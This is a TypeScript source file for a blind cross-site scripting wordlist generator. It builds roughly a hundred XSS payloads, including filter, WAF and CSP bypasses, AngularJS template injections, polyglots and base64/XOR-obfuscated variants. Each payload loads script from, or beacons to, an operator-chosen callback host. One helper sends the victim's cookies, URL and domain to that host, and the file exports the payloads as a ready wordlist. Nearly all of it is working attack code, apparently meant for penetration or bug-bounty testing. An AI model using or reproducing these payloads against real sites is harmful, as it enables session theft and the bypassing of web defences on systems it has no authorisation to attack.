// ── Types ────────────────────────────────────────────────────────────────────

export interface Payload {
  pid: string;
  payload: string;
  description: string;
  category: string;
}

export type CategoryName =
  | 'basic'
  | 'event'
  | 'bypass'
  | 'waf'
  | 'csp'
  | 'polyglot'
  | 'angular'
  | 'dom'
  | 'obfuscated';

export const ALL_CATEGORIES: CategoryName[] = [
  'basic',
  'event',
  'bypass',
  'waf',
  'csp',
  'polyglot',
  'angular',
  'dom',
  'obfuscated',
];

export const CATEGORY_INFO: Record<CategoryName, { label: string; icon: string; desc: string }> = {
  basic:      { label: 'Basic',      icon: '🎯', desc: 'Script, img, svg, iframe...' },
  event:      { label: 'Event',      icon: '⚡', desc: 'onload, onerror, onmouseover...' },
  bypass:     { label: 'Bypass',     icon: '🔓', desc: 'Case, quotes, encoding...' },
  waf:        { label: 'WAF',        icon: '🛡️', desc: 'Cloudflare, Akamai, Incapsula...' },
  csp:        { label: 'CSP',        icon: '🔒', desc: 'Content Security Policy bypass' },
  polyglot:   { label: 'Polyglot',   icon: '🧬', desc: 'Multi-context payloads' },
  angular:    { label: 'Angular',    icon: '🅰️', desc: 'AngularJS/CSTI injections' },
  dom:        { label: 'DOM',        icon: '🌐', desc: 'DOM-based XSS' },
  obfuscated: { label: 'Obfuscated', icon: '🔮', desc: 'Base64, unicode, XOR...' },
};

// ── Context-escape prefixes ─────────────────────────────────────────────────

export interface ContextBreaker {
  id: string;
  char: string;
  label: string;
  description: string;
}

export const CONTEXT_BREAKERS: ContextBreaker[] = [
  { id: 'dquote',     char: '"',    label: '"',    description: 'Double quote - sortir d\'un attribut HTML "value"' },
  { id: 'squote',     char: "'",    label: "'",    description: 'Single quote - sortir d\'un attribut HTML \'value\'' },
  { id: 'backtick',   char: '`',    label: '`',    description: 'Backtick - sortir d\'un template literal JS' },
  { id: 'gt',         char: '>',    label: '>',    description: 'Greater than - fermer un tag HTML ouvert' },
  { id: 'lt',         char: '<',    label: '<',    description: 'Less than - début de nouveau tag' },
  { id: 'slash',      char: '/',    label: '/',    description: 'Slash - fermer un tag self-closing ou path' },
  { id: 'semicolon',  char: ';',    label: ';',    description: 'Semicolon - terminer une instruction JS' },
  { id: 'rparen',     char: ')',    label: ')',     description: 'Parenthèse fermante - sortir d\'un appel de fonction' },
  { id: 'rbrace',     char: '}',    label: '}',    description: 'Accolade fermante - sortir d\'un bloc JS' },
  { id: 'rbracket',   char: ']',    label: ']',    description: 'Crochet fermant - sortir d\'un tableau JS' },
  { id: 'slashslash', char: '//',   label: '//',   description: 'Commentaire ligne JS - neutraliser le reste' },
  { id: 'slashstar',  char: '/*',   label: '/*',   description: 'Commentaire bloc JS ouvert' },
  { id: 'starslash',  char: '*/',   label: '*/',   description: 'Commentaire bloc JS fermé' },
  { id: 'colon',      char: ':',    label: ':',    description: 'Colon - séparateur dans divers contextes' },
  { id: 'question',   char: '?',    label: '?',    description: 'Point d\'interrogation - ternaire ou URL param' },
  { id: 'hash',       char: '#',    label: '#',    description: 'Hash - fragment URL ou commentaire' },
  { id: 'ampersand',  char: '&',    label: '&',    description: 'Ampersand - séparateur de paramètres URL' },
  { id: 'equals',     char: '=',    label: '=',    description: 'Equals - fin de valeur d\'attribut' },
  { id: 'closescript',char: '</script>',  label: '</script>',  description: 'Fermer un tag script existant' },
  { id: 'closestyle', char: '</style>',   label: '</style>',   description: 'Fermer un tag style existant' },
  { id: 'closetitle', char: '</title>',   label: '</title>',   description: 'Fermer un tag title existant' },
  { id: 'closetextarea', char: '</textarea>', label: '</textarea>', description: 'Fermer un tag textarea existant' },
  { id: 'newline',    char: '\n',   label: '\\n',  description: 'Newline - casser une chaîne JS ou sortir d\'un contexte' },
  { id: 'crlf',       char: '\r\n', label: '\\r\\n', description: 'CRLF - injection de header HTTP' },
];

// ── Helpers ──────────────────────────────────────────────────────────────────

function b64Encode(str: string): string {
  return btoa(unescape(encodeURIComponent(str)));
}

function makeCallback(ip: string, pid: string): string {
  return `${ip}/${pid}`;
}

function scriptLoader(ip: string, pid: string): string {
  const cb = makeCallback(ip, pid);
  return `var s=document.createElement('script');s.src='${cb}';document.body.appendChild(s);`;
}

function imgBeacon(ip: string, pid: string): string {
  const cb = makeCallback(ip, pid);
  return `new Image().src='${cb}';`;
}

function fullDataExfil(ip: string, pid: string): string {
  const cb = makeCallback(ip, pid);
  return `var d=document;fetch('${cb}?c='+encodeURIComponent(d.cookie)+'&u='+encodeURIComponent(d.URL)+'&o='+encodeURIComponent(d.domain));`;
}

// ── Build payloads ──────────────────────────────────────────────────────────

export function buildPayloads(ip: string): Record<CategoryName, Payload[]> {
  const categories: Record<string, Payload[]> = {};

  // ═══ BASIC ═══
  const basic: Payload[] = [];

  let pid = 'BAS-001';
  basic.push({ pid, payload: `<script src='${makeCallback(ip, pid)}'></script>`, description: 'Basic <script> tag avec src callback', category: 'basic' });

  pid = 'BAS-002';
  basic.push({ pid, payload: `<script>${scriptLoader(ip, pid)}</script>`, description: 'Basic <script> inline avec script loader', category: 'basic' });

  pid = 'BAS-003';
  basic.push({ pid, payload: `<img src=x onerror="${scriptLoader(ip, pid)}">`, description: 'img onerror avec script loader', category: 'basic' });

  pid = 'BAS-004';
  basic.push({ pid, payload: `<svg onload="${scriptLoader(ip, pid)}">`, description: 'svg onload avec script loader', category: 'basic' });

  pid = 'BAS-005';
  basic.push({ pid, payload: `<body onload="${scriptLoader(ip, pid)}">`, description: 'body onload avec script loader', category: 'basic' });

  pid = 'BAS-006';
  basic.push({ pid, payload: `<iframe onload="${scriptLoader(ip, pid)}">`, description: 'iframe onload', category: 'basic' });

  pid = 'BAS-007';
  basic.push({ pid, payload: `<input autofocus onfocus="${scriptLoader(ip, pid)}">`, description: 'input autofocus + onfocus', category: 'basic' });

  pid = 'BAS-008';
  basic.push({ pid, payload: `<details open ontoggle="${scriptLoader(ip, pid)}">`, description: 'details ontoggle', category: 'basic' });

  pid = 'BAS-009';
  basic.push({ pid, payload: `<marquee onstart="${scriptLoader(ip, pid)}">`, description: 'marquee onstart', category: 'basic' });

  pid = 'BAS-010';
  basic.push({ pid, payload: `<video src=x onerror="${scriptLoader(ip, pid)}">`, description: 'video onerror', category: 'basic' });

  pid = 'BAS-011';
  basic.push({ pid, payload: `<audio src=x onerror="${scriptLoader(ip, pid)}">`, description: 'audio onerror', category: 'basic' });

  pid = 'BAS-012';
  basic.push({ pid, payload: `<script>${fullDataExfil(ip, pid)}</script>`, description: 'Exfiltration complète (cookie+URL+domain)', category: 'basic' });

  pid = 'BAS-013';
  basic.push({ pid, payload: `javascript:${scriptLoader(ip, pid)}`, description: 'javascript: URI pour href/link', category: 'basic' });

  pid = 'BAS-014';
  basic.push({ pid, payload: `<object data='javascript:${imgBeacon(ip, pid)}'>`, description: 'object data javascript URI', category: 'basic' });

  categories['basic'] = basic;

  // ═══ EVENT ═══
  const event: Payload[] = [];
  const eventsTags: [string, string, string][] = [
    ['EVT-001', '<body', 'onpageshow'],
    ['EVT-002', '<body', 'onhashchange'],
    ['EVT-003', '<svg', 'onanimationstart'],
    ['EVT-004', '<svg', 'onanimationend'],
    ['EVT-005', '<form', 'oninput'],
    ['EVT-006', '<select', 'onchange'],
    ['EVT-007', '<textarea', 'onfocus'],
    ['EVT-008', '<video', 'oncanplay'],
    ['EVT-009', '<track', 'onerror'],
    ['EVT-010', '<object', 'onafterscriptexecute'],
    ['EVT-011', '<object', 'onbeforescriptexecute'],
    ['EVT-012', '<div', 'onmouseover'],
    ['EVT-013', "<a href='#'", 'onmousedown'],
    ['EVT-014', '<button', 'onclick'],
    ['EVT-015', '<div', 'onclick'],
  ];

  for (const [p, tag, evtName] of eventsTags) {
    event.push({ pid: p, payload: `${tag} ${evtName}="${scriptLoader(ip, p)}">`, description: `${tag} ${evtName}`, category: 'event' });
  }
  categories['event'] = event;

  // ═══ BYPASS ═══
  const bypass: Payload[] = [];

  pid = 'BYP-001';
  bypass.push({ pid, payload: `<sCrIpT sRc='${makeCallback(ip, pid)}'></ScRiPt>`, description: 'Bypass case sensitive - mixed case tag', category: 'bypass' });

  pid = 'BYP-002';
  bypass.push({ pid, payload: `<script x src='${makeCallback(ip, pid)}'></script>`, description: 'Bypass tag blacklist - extra attribute', category: 'bypass' });

  pid = 'BYP-003';
  bypass.push({ pid, payload: `<img src='1' onerror='${scriptLoader(ip, pid)}' <`, description: 'Bypass incomplete HTML tag', category: 'bypass' });

  pid = 'BYP-004';
  bypass.push({ pid, payload: `<script>window['fetch']('${makeCallback(ip, pid)}')</script>`, description: 'Bypass dot filter - bracket notation', category: 'bypass' });

  pid = 'BYP-005';
  const jsCode005 = `var s=document.createElement('script');s.src='${makeCallback(ip, pid)}';document.body.appendChild(s);`;
  const encoded005 = b64Encode(jsCode005);
  bypass.push({ pid, payload: `<script>eval(atob('${encoded005}'))</script>`, description: 'Bypass dot filter - base64 atob()', category: 'bypass' });

  pid = 'BYP-006';
  bypass.push({ pid, payload: `<svg onload=fetch\`${makeCallback(ip, pid)}\`>`, description: 'Bypass parenthesis - template literals', category: 'bypass' });

  pid = 'BYP-007';
  bypass.push({ pid, payload: `<script>onerror=${imgBeacon(ip, pid)};throw 1337</script>`, description: 'Bypass parens+semicolon - onerror+throw', category: 'bypass' });

  pid = 'BYP-008';
  bypass.push({ pid, payload: `<img/src='1'/onerror=${imgBeacon(ip, pid)}>`, description: 'Bypass space filter - slash separator', category: 'bypass' });

  pid = 'BYP-009';
  bypass.push({ pid, payload: `<svg\fonload\f=\f${imgBeacon(ip, pid)}\f>`, description: 'Bypass space filter - form-feed 0x0C', category: 'bypass' });

  pid = 'BYP-010';
  const cb010 = makeCallback(ip, pid);
  const charCodes010 = cb010.split('').map(c => c.charCodeAt(0)).join(',');
  bypass.push({ pid, payload: `<script>var s=document.createElement('script');s.src=String.fromCharCode(${charCodes010});document.body.appendChild(s);</script>`, description: 'Bypass quotes - String.fromCharCode', category: 'bypass' });

  pid = 'BYP-011';
  bypass.push({ pid, payload: `</script><script src='${makeCallback(ip, pid)}'></script>`, description: 'Break out of existing script tag', category: 'bypass' });

  pid = 'BYP-012';
  bypass.push({ pid, payload: `<img src='1' onerror\x00=${imgBeacon(ip, pid)} />`, description: 'Bypass onxxx= blacklist - null byte', category: 'bypass' });

  pid = 'BYP-013';
  bypass.push({ pid, payload: `<svg onload=${imgBeacon(ip, pid)}//`, description: 'Bypass > using nothing - browser fixes', category: 'bypass' });

  pid = 'BYP-014';
  const cb014 = makeCallback(ip, pid);
  const part1 = cb014.substring(0, Math.floor(cb014.length / 2));
  const part2 = cb014.substring(Math.floor(cb014.length / 2));
  bypass.push({ pid, payload: `<script>eval('var s=document.createElement("script");s.src="'+'${part1}'+'${part2}'+'";document.body.appendChild(s);')</script>`, description: 'Bypass word blacklist - eval string concatenation', category: 'bypass' });

  pid = 'BYP-015';
  const cbEncoded015 = encodeURIComponent(makeCallback(ip, pid));
  bypass.push({ pid, payload: `<svg onload=%26%2397%3Bfetch('${cbEncoded015}')>`, description: 'Bypass HTML encoding - %26%23 trick', category: 'bypass' });

  pid = 'BYP-016';
  bypass.push({ pid, payload: `<a href='' onmousedown="var x='&#39;;${imgBeacon(ip, pid)}//'">Click</a>`, description: 'Bypass quotes in mousedown - &#39;', category: 'bypass' });

  pid = 'BYP-017';
  bypass.push({ pid, payload: `<div id=x></div><script>window['doc'+'ument']['loc'+'ation']='javascript:${imgBeacon(ip, pid)}'</script>`, description: 'Bypass document blacklist - string concatenation', category: 'bypass' });

  categories['bypass'] = bypass;

  // ═══ WAF ═══
  const waf: Payload[] = [];

  pid = 'WAF-001';
  waf.push({ pid, payload: `<svg/onrandom=random onload=${imgBeacon(ip, pid)}>`, description: 'Cloudflare bypass - random attribute', category: 'waf' });

  pid = 'WAF-002';
  waf.push({ pid, payload: `<svg/OnLoad="\`\${${imgBeacon(ip, pid)}}\`">`, description: 'Cloudflare bypass - template literal OnLoad', category: 'waf' });

  pid = 'WAF-003';
  waf.push({ pid, payload: `<svg/onload=&nbsp;${imgBeacon(ip, pid)}+`, description: 'Cloudflare bypass - &nbsp; before payload', category: 'waf' });

  pid = 'WAF-004';
  waf.push({ pid, payload: `1'"><img/src/onerror=.1|${imgBeacon(ip, pid)}>`, description: 'Cloudflare bypass - .1| trick', category: 'waf' });

  pid = 'WAF-005';
  const inner005 = `<script>new Image().src='${makeCallback(ip, pid)}'</script>`;
  const innerEnc005 = inner005.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  waf.push({ pid, payload: `xss'"><iframe srcdoc='${innerEnc005}'>`, description: 'Cloudflare bypass - iframe srcdoc with encoding', category: 'waf' });

  pid = 'WAF-006';
  waf.push({ pid, payload: `<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>`, description: 'Cloudflare bypass - HTML entity number encoding', category: 'waf' });

  pid = 'WAF-007';
  waf.push({ pid, payload: `<svg onload\r\n=$.globalEval("${imgBeacon(ip, pid)}");>`, description: 'Incapsula bypass - CRLF in event handler', category: 'waf' });

  pid = 'WAF-008';
  const innerJs008 = `<script>${imgBeacon(ip, pid)}</script>`;
  const b64_008 = b64Encode(innerJs008);
  waf.push({ pid, payload: `<object data='data:text/html;base64,${b64_008}'></object>`, description: 'Incapsula bypass - base64 object data', category: 'waf' });

  pid = 'WAF-009';
  waf.push({ pid, payload: `<dETAILS%0aopen%0aonToGgle%0a=%0a${imgBeacon(ip, pid)} x>`, description: 'Akamai bypass - details ontoggle with newlines', category: 'waf' });

  pid = 'WAF-010';
  waf.push({ pid, payload: `<a href=javas&#99;ript:${imgBeacon(ip, pid)}>Click</a>`, description: 'WordFence bypass - HTML entity in javascript:', category: 'waf' });

  pid = 'WAF-011';
  waf.push({ pid, payload: `\\u003e\\u003c\\u0068\\u0031 onclick="${imgBeacon(ip, pid)}"\\u003e`, description: 'Fortiweb bypass - unicode escape sequences', category: 'waf' });

  pid = 'WAF-012';
  waf.push({ pid, payload: `<a href="j\tav\tasc\nri\tpt\t:${imgBeacon(ip, pid)}">X</a>`, description: 'Cloudflare bypass - tab/newline in javascript URI', category: 'waf' });

  categories['waf'] = waf;

  // ═══ CSP ═══
  const csp: Payload[] = [];

  pid = 'CSP-001';
  csp.push({ pid, payload: `<script/src=//google.com/complete/search?client=chrome%26jsonp=${imgBeacon(ip, pid)}>`, description: 'CSP bypass - JSONP via Google', category: 'csp' });

  pid = 'CSP-002';
  csp.push({ pid, payload: `<script/src=//www.youtube.com/oembed?callback=fetch></script>`, description: 'CSP bypass - JSONP via YouTube', category: 'csp' });

  pid = 'CSP-003';
  csp.push({ pid, payload: `<script>f=document.createElement('iframe');f.src='/robots.txt';f.onload=()=>{x=document.createElement('script');x.src='${makeCallback(ip, pid)}';f.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>`, description: 'CSP bypass - default-src self via iframe', category: 'csp' });

  pid = 'CSP-004';
  const innerJs004 = `<script>${imgBeacon(ip, pid)}</script>`;
  const b64_004 = b64Encode(innerJs004);
  csp.push({ pid, payload: `<object data='data:text/html;base64,${b64_004}'></object>`, description: 'CSP bypass - script-src self via object data base64', category: 'csp' });

  pid = 'CSP-005';
  const innerB64_005 = b64Encode(imgBeacon(ip, pid));
  csp.push({ pid, payload: `<script src='data:application/javascript;base64,${innerB64_005}'>/</script>`, description: 'CSP bypass - script-src data: via data URI', category: 'csp' });

  pid = 'CSP-006';
  csp.push({ pid, payload: `<base href='${makeCallback(ip, pid)}'>`, description: 'CSP bypass - nonce via base tag injection', category: 'csp' });

  pid = 'CSP-007';
  csp.push({ pid, payload: `"/><script>${imgBeacon(ip, pid)}</script>`, description: 'CSP unsafe-inline bypass - break out of attribute', category: 'csp' });

  pid = 'CSP-008';
  const params008 = '&a='.repeat(50);
  csp.push({ pid, payload: `GET /?xss=<script src='${makeCallback(ip, pid)}'></script>${params008}`, description: 'CSP bypass - PHP header via many GET params', category: 'csp' });

  categories['csp'] = csp;

  // ═══ POLYGLOT ═══
  const polyglot: Payload[] = [];

  pid = 'POL-001';
  polyglot.push({ pid, payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=${imgBeacon(ip, pid)} )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csvg/<svg/oNloAd=${imgBeacon(ip, pid)}//>/\\x3e`, description: 'Polyglot 0xsobky style - multi-context', category: 'polyglot' });

  pid = 'POL-002';
  polyglot.push({ pid, payload: `">><marquee><img src=x onerror=${imgBeacon(ip, pid)}></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=${imgBeacon(ip, pid)} ><script>${imgBeacon(ip, pid)}</script>`, description: 'Polyglot Ashar Javed style - HTML multi-context', category: 'polyglot' });

  pid = 'POL-003';
  polyglot.push({ pid, payload: `" onclick=${imgBeacon(ip, pid)}//<button ' onclick=${imgBeacon(ip, pid)}//>`, description: 'Polyglot Mathias Karlsson - attribute/HTML context', category: 'polyglot' });

  pid = 'POL-004';
  polyglot.push({ pid, payload: `javascript:"/*\\"/*\`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg/onload=/*<html/*/onmouseover=${imgBeacon(ip, pid)}//>`, description: 'Polyglot EdOverflow - JS string/HTML/attribute context', category: 'polyglot' });

  pid = 'POL-005';
  polyglot.push({ pid, payload: `JavaScript://%250A${imgBeacon(ip, pid)}//'/*\\'/*"/*\\"/*\`/*\\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*\${};{${imgBeacon(ip, pid)}}//><Base/Href=//${makeCallback(ip, pid)}\\76-->`, description: 'Polyglot brutelogic comprehensive - tous contextes', category: 'polyglot' });

  pid = 'POL-006';
  polyglot.push({ pid, payload: `-->'"/><br></sCript><svG x=">" onload=(fetch)\`${makeCallback(ip, pid)}\`>`, description: 'Polyglot s0md3v - SVG template literal fetch', category: 'polyglot' });

  pid = 'POL-007';
  polyglot.push({ pid, payload: `<svg%0Ao%00nload=${imgBeacon(ip, pid)}//`, description: 'Polyglot - SVG null byte + CRLF', category: 'polyglot' });

  categories['polyglot'] = polyglot;

  // ═══ ANGULAR ═══
  const angular: Payload[] = [];

  pid = 'ANG-001';
  const cbInner001 = `var _=document.createElement('script');_.src='${makeCallback(ip, pid)}';document.getElementsByTagName('body')[0].appendChild(_)`;
  angular.push({ pid, payload: `{{constructor.constructor("${cbInner001}")()}}`, description: 'Angular CSTI 1.0.1-1.1.5 / >1.6.0 - Mario Heiderich', category: 'angular' });

  pid = 'ANG-002';
  const cbInner002 = `var _=document.createElement('script');_.src='${makeCallback(ip, pid)}';document.getElementsByTagName('body')[0].appendChild(_)`;
  angular.push({ pid, payload: `{{$on.constructor("${cbInner002}")()}}`, description: 'Angular CSTI - Lewis Ardern & Gareth Heyes (shorter)', category: 'angular' });

  pid = 'ANG-003';
  angular.push({ pid, payload: `{{'a'.constructor.prototype.charAt=''.trim;$eval("a]eval('new Image().src=\\'${makeCallback(ip, pid)}\\''),a")}}`, description: 'Angular CSTI 1.2.0-1.2.5 - Gareth Heyes', category: 'angular' });

  pid = 'ANG-004';
  angular.push({ pid, payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`new Image().src=\\'${makeCallback(ip, pid)}\\'\`),a')}}`, description: 'Angular CSTI 1.4.0-1.5.8 - Gareth Heyes', category: 'angular' });

  pid = 'ANG-005';
  const fromCharCodes005 = makeCallback(ip, pid).split('').map(c => c.charCodeAt(0)).join(',');
  angular.push({ pid, payload: `{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,${fromCharCodes005},39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))()}}`, description: 'Angular CSTI 1.6+ sans quotes - via fromCharCode', category: 'angular' });

  pid = 'ANG-006';
  const cbInner006 = `var _=document.createElement('script');_.src='${makeCallback(ip, pid)}';document.getElementsByTagName('body')[0].appendChild(_)`;
  angular.push({ pid, payload: `{{$eval.constructor("${cbInner006}")()}}`, description: 'Angular CSTI 1.6+ via $eval.constructor', category: 'angular' });

  pid = 'ANG-007';
  angular.push({ pid, payload: `{{constructor.constructor("new Image().src='${makeCallback(ip, pid)}'")()}}`, description: 'VueJS template injection - constructor.constructor', category: 'angular' });

  categories['angular'] = angular;

  // ═══ DOM ═══
  const dom: Payload[] = [];

  pid = 'DOM-001';
  dom.push({ pid, payload: `#<script src='${makeCallback(ip, pid)}'></script>`, description: 'DOM XSS via location.hash - script injection', category: 'dom' });

  pid = 'DOM-002';
  dom.push({ pid, payload: `javascript:document.write('<script src="${makeCallback(ip, pid)}"><\\/script>')`, description: 'DOM XSS via document.write javascript URI', category: 'dom' });

  pid = 'DOM-003';
  dom.push({ pid, payload: `<img src=x onerror=${imgBeacon(ip, pid)}>`, description: 'DOM XSS via innerHTML - img onerror', category: 'dom' });

  pid = 'DOM-004';
  dom.push({ pid, payload: `'-${imgBeacon(ip, pid)}-'`, description: 'DOM XSS - break out of JS string in eval context', category: 'dom' });

  pid = 'DOM-005';
  dom.push({ pid, payload: `<script>window.postMessage('<img src=x onerror="${imgBeacon(ip, pid)}">', '*');</script>`, description: 'DOM XSS via postMessage', category: 'dom' });

  pid = 'DOM-006';
  dom.push({ pid, payload: `javascript:${imgBeacon(ip, pid)}location.href`, description: 'DOM XSS via location redirect', category: 'dom' });

  pid = 'DOM-007';
  dom.push({ pid, payload: `#<img src=x onerror=${imgBeacon(ip, pid)}>`, description: 'DOM XSS via hash - innerHTML sink', category: 'dom' });

  categories['dom'] = dom;

  // ═══ OBFUSCATED ═══
  const obfuscated: Payload[] = [];

  pid = 'OBF-001';
  const cb001 = makeCallback(ip, pid);
  obfuscated.push({ pid, payload: `<script>\\u0076\\u0061\\u0072 \\u0073=\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074.\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0045\\u006C\\u0065\\u006D\\u0065\\u006E\\u0074('\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074');\\u0073.\\u0073\\u0072\\u0063='${cb001}';\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074.\\u0062\\u006F\\u0064\\u0079.\\u0061\\u0070\\u0070\\u0065\\u006E\\u0064\\u0043\\u0068\\u0069\\u006C\\u0064(\\u0073);</script>`, description: 'Obfuscated - unicode escape sequences', category: 'obfuscated' });

  pid = 'OBF-002';
  const b64_002 = b64Encode(imgBeacon(ip, pid));
  obfuscated.push({ pid, payload: `<script>Function(atob('${b64_002}'))()</script>`, description: 'Obfuscated - base64 + Function() constructor', category: 'obfuscated' });

  pid = 'OBF-003';
  const b64_003 = b64Encode(imgBeacon(ip, pid));
  obfuscated.push({ pid, payload: `<script>eval(atob('${b64_003}'))</script>`, description: 'Obfuscated - base64 + eval(atob())', category: 'obfuscated' });

  pid = 'OBF-004';
  obfuscated.push({ pid, payload: `<script>setTimeout('new I'+'mage().s'+'rc="${makeCallback(ip, pid)}"',0)</script>`, description: 'Obfuscated - string concat dans setTimeout', category: 'obfuscated' });

  pid = 'OBF-005';
  obfuscated.push({ pid, payload: `<script>eval('\\146\\145\\164\\143\\150("' + '${makeCallback(ip, pid)}' + '")')</script>`, description: 'Obfuscated - octal encoding (fetch)', category: 'obfuscated' });

  pid = 'OBF-006';
  const urlEncoded006 = encodeURIComponent(imgBeacon(ip, pid));
  obfuscated.push({ pid, payload: `<script>eval(decodeURIComponent('${urlEncoded006}'))</script>`, description: 'Obfuscated - URL encoding + decodeURIComponent', category: 'obfuscated' });

  pid = 'OBF-007';
  obfuscated.push({ pid, payload: `<script>['${makeCallback(ip, pid)}'].map(u=>{var s=document.createElement('script');s.src=u;document.body.appendChild(s)})</script>`, description: 'Obfuscated - Array.map arrow function', category: 'obfuscated' });

  pid = 'OBF-008';
  obfuscated.push({ pid, payload: `<script>this['fe'+'tch']('${makeCallback(ip, pid)}')</script>`, description: 'Obfuscated - this[] + split string concatenation', category: 'obfuscated' });

  pid = 'OBF-009';
  obfuscated.push({ pid, payload: `<script>a=()=>{c=0;for(i in self){if(/^fe[tc]+h$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]('${makeCallback(ip, pid)}')</script>`, description: 'Obfuscated - Object.keys + regex pour trouver fetch', category: 'obfuscated' });

  pid = 'OBF-010';
  const key = 42;
  const cbXor = makeCallback(ip, pid);
  const payloadStr = `new Image().src='${cbXor}';`;
  const xored = payloadStr.split('').map(c => c.charCodeAt(0) ^ key);
  const xoredStr = xored.join(',');
  obfuscated.push({ pid, payload: `<script>eval(String.fromCharCode(...[${xoredStr}].map(c=>c^${key})))</script>`, description: 'Obfuscated - XOR simple avec Map + fromCharCode', category: 'obfuscated' });

  categories['obfuscated'] = obfuscated;

  return categories as Record<CategoryName, Payload[]>;
}

// ── Apply context breakers ──────────────────────────────────────────────────

export function applyContextBreakers(
  payloads: Payload[],
  selectedBreakers: string[],
  breakerMode: 'prefix' | 'suffix' | 'both' | 'combo'
): Payload[] {
  if (selectedBreakers.length === 0) return payloads;

  const breakerChars = selectedBreakers
    .map(id => CONTEXT_BREAKERS.find(b => b.id === id))
    .filter((b): b is ContextBreaker => b !== undefined);

  if (breakerChars.length === 0) return payloads;

  const result: Payload[] = [];

  // Always include originals
  result.push(...payloads);

  if (breakerMode === 'combo') {
    // Generate a combined prefix from all selected breakers
    const combinedPrefix = breakerChars.map(b => b.char).join('');
    for (const p of payloads) {
      result.push({
        ...p,
        pid: `${p.pid}-CMB`,
        payload: `${combinedPrefix}${p.payload}`,
        description: `${p.description} [combined prefix: ${breakerChars.map(b => b.label).join('')}]`,
      });
    }
  } else {
    // Individual breakers
    for (const breaker of breakerChars) {
      for (const p of payloads) {
        if (breakerMode === 'prefix' || breakerMode === 'both') {
          result.push({
            ...p,
            pid: `${p.pid}-P${breaker.id.toUpperCase().substring(0, 3)}`,
            payload: `${breaker.char}${p.payload}`,
            description: `${p.description} [prefix: ${breaker.label}]`,
          });
        }
        if (breakerMode === 'suffix' || breakerMode === 'both') {
          result.push({
            ...p,
            pid: `${p.pid}-S${breaker.id.toUpperCase().substring(0, 3)}`,
            payload: `${p.payload}${breaker.char}`,
            description: `${p.description} [suffix: ${breaker.label}]`,
          });
        }
      }
    }
  }

  return result;
}

// ── Export to file content ──────────────────────────────────────────────────

export function generateWordlistContent(
  payloads: Payload[],
  ip: string,
  selectedCategories: CategoryName[],
  includeComments: boolean
): string {
  const lines: string[] = [];
  const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

  if (includeComments) {
    lines.push(`# BLIND XSS WORDLIST`);
    lines.push(`# Generated : ${now}`);
    lines.push(`# Callback IP : ${ip}`);
    lines.push(`# Categories : ${selectedCategories.join(', ')}`);
    lines.push(`# Total payloads : ${payloads.length}`);
    lines.push(`# Each payload contains a unique ID for easy identification when triggered`);
    lines.push(`#`);
    lines.push(`# HOW TO READ RESULTS:`);
    lines.push(`#   When your server receives a hit on ${ip}/<PAYLOAD_ID>,`);
    lines.push(`#   you know exactly which payload triggered the XSS.`);
    lines.push(`# ${'─'.repeat(70)}`);
    lines.push('');
  }

  let currentCat = '';
  for (const p of payloads) {
    if (includeComments && p.category !== currentCat) {
      currentCat = p.category;
      lines.push('');
      lines.push(`# ${'═'.repeat(68)}`);
      lines.push(`# CATEGORY: ${currentCat.toUpperCase()}`);
      lines.push(`# ${'═'.repeat(68)}`);
      lines.push('');
    }

    if (includeComments) {
      lines.push(`# [${p.pid}] ${p.description}`);
    }
    lines.push(p.payload);
    if (includeComments) {
      lines.push('');
    }
  }

  return lines.join('\n');
}
